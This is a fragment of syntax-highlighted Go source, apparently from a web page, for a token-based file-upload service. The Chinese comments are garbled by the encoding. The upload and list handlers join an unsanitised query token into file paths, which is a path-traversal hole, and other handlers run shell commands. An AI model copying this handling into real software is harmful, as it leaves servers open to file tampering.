&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Stderr&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#75af00">outerr&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// res := &amp;#34;ERROR&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">TokenResult&lt;/span>&lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Wait&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Failed&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">outerr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">String&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Success&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">outinfo&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">String&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Marshal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">type&lt;/span> &lt;span style="color:#75af00">ListFileResult&lt;/span> &lt;span style="color:#00a8c8">struct&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">Files&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;files&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// æŸ¥çœ‹å½“å‰ token ä¸‹çš„æ–‡ä»¶
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">listFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ResponseWriter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">values&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">URL&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Query&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">values&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;token&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fromHostList&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">RemoteAddr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;:&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fromHost&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fromHostList&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fromHost&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">fromHostList&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// éªŒè¯token
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">checkToken&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">fromHost&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">dir&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">filepath&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;uploads&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// å¸¦ç€tokenè·å–å·²ç»ä¸Šä¼ çš„æ–‡ä»¶
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">ioutil&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ReadDir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">dir&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">string&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">f&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#00a8c8">range&lt;/span> &lt;span style="color:#75af00">files&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Name&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Marshal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ListFileResult&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#75af00">Files&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">type&lt;/span> &lt;span style="color:#75af00">UploadFileResult&lt;/span> &lt;span style="color:#00a8c8">struct&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">Code&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;code&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">uploadFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ResponseWriter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fprintf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;get&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">values&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">URL&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Query&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">values&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;token&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// getæ–¹å¼ä¼ å…¥tokenå‚æ•°
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fromHostList&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">RemoteAddr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;:&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fromHost&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fromHostList&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fromHost&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">fromHostList&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// éªŒè¯token
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">checkToken&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">fromHost&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">dir&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">filepath&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;uploads&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// å°†è·å–åˆ°çš„tokenæ–°å»ºæ–‡ä»¶å¤¹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">os&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Stat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">dir&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">os&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">MkdirAll&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">dir&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0766&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">ioutil&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ReadDir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">dir&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">command&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Command&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;curl&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;127.0.0.1:9091/manage&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// å¦‚æœæ–‡ä»¶å¤§äºäº”ä¸ª åˆ™æœ¬åœ°è®¿é—®9091/manageåˆ é™¤æ‰€æœ‰æ–‡ä»¶
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ParseMultipartForm&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">FormFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Marshal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">UploadFileResult&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#75af00">Code&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">()})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">defer&lt;/span> &lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fileName&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">RandStringBytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">os&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">OpenFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">filepath&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">dir&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">fileName&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#75af00">os&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">O_WRONLY&lt;/span>&lt;span style="color:#111">|&lt;/span>&lt;span style="color:#75af00">os&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">O_CREATE&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0666&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">defer&lt;/span> &lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Copy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">)&lt;/span>
